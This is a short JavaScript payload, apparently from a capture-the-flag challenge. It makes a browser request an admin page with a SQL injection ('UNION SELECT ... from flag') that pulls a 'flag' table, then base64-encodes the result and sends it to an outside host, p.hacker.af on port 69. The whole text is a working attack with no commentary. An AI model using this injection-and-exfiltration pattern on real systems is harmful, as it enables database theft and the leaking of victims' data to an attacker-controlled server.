var xhr = new XMLHttpRequest();
xhr.open("GET", "/admin/view/-1 UnIoN SelEct 1,flag,3,4,5 from flag", false)
xhr.send()

var xhr2 = new XMLHttpRequest();
xhr2.open("GET", "http://p.hacker.af:69/"+btoa(xhr.responseText), false)
xhr2.send()

